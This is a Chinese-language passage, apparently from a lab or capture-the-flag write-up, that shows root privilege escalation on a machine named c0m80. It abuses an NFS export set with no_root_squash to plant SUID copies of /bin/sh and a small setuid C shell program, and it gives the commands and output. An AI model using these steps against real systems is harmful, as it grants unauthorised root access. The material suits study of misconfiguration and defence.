### NFS 配置不当

这一步在横向之后

NFS 服务器配置了 no_root_squash，这意味着客户端`root`用户与服务器`root`用户拥有相同的权限，也就是说客户端 uid 0 与服务器 uid 0 相同

```bash
$ cat /etc/exports
/ftpsvr/bkp           *(rw,sync,no_root_squash,no_subtree_check)
```

在 `al1ce` Shell 中复制 `/bin/sh` 到 `/ftpsvr/bkp/sh`

```bash
mount -t nfs 192.168.110.142:/ftpsvr/bkp ./ftpsvr
```

更改挂载目录中 `sh` 的所有者为 `root:root` 并添加 SUID 位

```bash
chown root:root ftpsvr/bkp/sh
chmod a+s ftpsvr/bkp/sh
```

在 `al1ce` Shell 中执行 `./sh`，获得有效用户 ID (euid) 为 root 的 Shell

```bash
al1ce@c0m80:/ftpsvr/bkp$ ./sh

root@c0m80# id
uid=1001(al1ce) gid=34(backup) euid=0(root) egid=0(root) groups=0(root),34(backup)
root#c0m80# 
```

由于实际 uid 仍是 `al1ce`，某些操作受限，需编译一个自定义程序

```c
#include <stdlib.h>
main() { setuid(0); system("/bin/sh"); }
```

编译为 `getroot`，同样通过 NFS 赋予 SUID 并执行，获得完整 root 权限
